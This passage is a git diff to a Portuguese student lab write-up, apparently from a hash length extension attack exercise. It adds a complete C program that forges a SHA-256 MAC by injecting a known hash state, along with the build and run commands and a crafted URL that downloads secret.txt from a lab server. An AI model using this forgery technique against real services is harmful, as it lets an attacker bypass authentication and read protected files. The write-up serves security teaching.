@@ -77,7 +77,9 @@ E funcionou
 
 Consegui enviar um pedido válido contendo os comandos lstcmd e download. O servidor validou o MAC e retornou o conteúdo do arquivo secret.txt, conforme mostra a imagem.
 
+
 ---
+Oq acontece quando entro com um MAC invalido ->
 "Internal Server Error
 
 The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application."
@@ -146,4 +148,86 @@ Guarde este valor URL Encoded, vamos usá-lo na URL final.
 
 ---
 
+Step 3
+
+``` txt    
+nano length_ext.c
+
+(Isso vai abrir um editor de texto vazio com esse nome).
+```
+
+Colei o file de C lá
+``` C
+/* length_ext.c */
+#include <stdio.h>
+#include <arpa/inet.h>
+#include <openssl/sha.h>
+
+int main(int argc, const char *argv[])
+{
+    int i;
+    unsigned char buffer[SHA256_DIGEST_LENGTH];
+    SHA256_CTX c;
+
+    SHA256_Init(&c);
+
+    // O SHA256 processa blocos de 64 bytes.
+    // Aqui enganamos o algoritmo dizendo que já processámos um bloco inteiro (64 bytes)
+    // que corresponde à mensagem original + o padding que calculamos na Tarefa 2.
+    for(i=0; i<64; i++)
+        SHA256_Update(&c, "*", 1);
+
+    // AQUI ESTÁ O TRUQUE:
+    // Injetamos o estado interno do hash que você obteve na Tarefa 1.
+    // Hash original: 7bada211 23c984d2 f2c90b21 8bc828b4 b3ae343d 90089987 0298a2f4 554a8bc4
+    c.h[0] = htole32(0x7bada211);
+    c.h[1] = htole32(0x23c984d2);
+    c.h[2] = htole32(0xf2c90b21);
+    c.h[3] = htole32(0x8bc828b4);
+    c.h[4] = htole32(0xb3ae343d);
+    c.h[5] = htole32(0x90089987);
+    c.h[6] = htole32(0x0298a2f4);
+    c.h[7] = htole32(0x554a8bc4);
+
+    // Adicionamos a mensagem extra que queremos executar
+    // A string é "&download=secret.txt"
+    // O tamanho dela é 20 caracteres.
+    SHA256_Update(&c, "&download=secret.txt", 20);
+
+    // Finalizamos o cálculo para obter o novo MAC forjado
+    SHA256_Final(buffer, &c);
+
+    for(i = 0; i < 32; i++) {
+        printf("%02x", buffer[i]);
+    }
+    printf("\n");
+    return 0;
+}
+```
+
+1. Pressione Ctrl + O (letra O) e depois Enter (para salvar).
+2. Pressione Ctrl + X (para sair).
+
+
+Compilar codigo
+``` txt
+gcc length_ext.c -o length_ext -lcrypto
+```
+E rodei o programa
+``` txt
+./length_ext
+```
+<img width="878" height="106" alt="{B796409B-0C18-4AB8-985D-B255D3368361}" src="https://github.com/user-attachments/assets/578f0534-c815-4c57-a954-29776e04d782" />
+
+Ele vai cuspir um novo hash na tela. Copie esse hash. Esse é o MAC que permite você baixar o arquivo secreto sem saber a senha, usando o ataque de extensão de comprimento
+
+Rodei e peguei esse MAC
+"0f59527893dec917f765e8a63cbe3350c15e25be614916815149109e97e9703c"
+0f59527893dec917f765e8a63cbe3350c15e25be614916815149109e97e9703c
+
+"http://10.9.0.80/?myname=Divaldo&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%38&download=secret.txt&mac=0f59527893dec917f765e8a63cbe3350c15e25be614916815149109e97e9703c"
+
+E já está feito
+
+<img width="719" height="573" alt="{17918767-9EC3-4D81-8788-81E98CEB184E}" src="https://github.com/user-attachments/assets/1627a9fd-3bb4-483d-ad75-be938a16946c" />
 
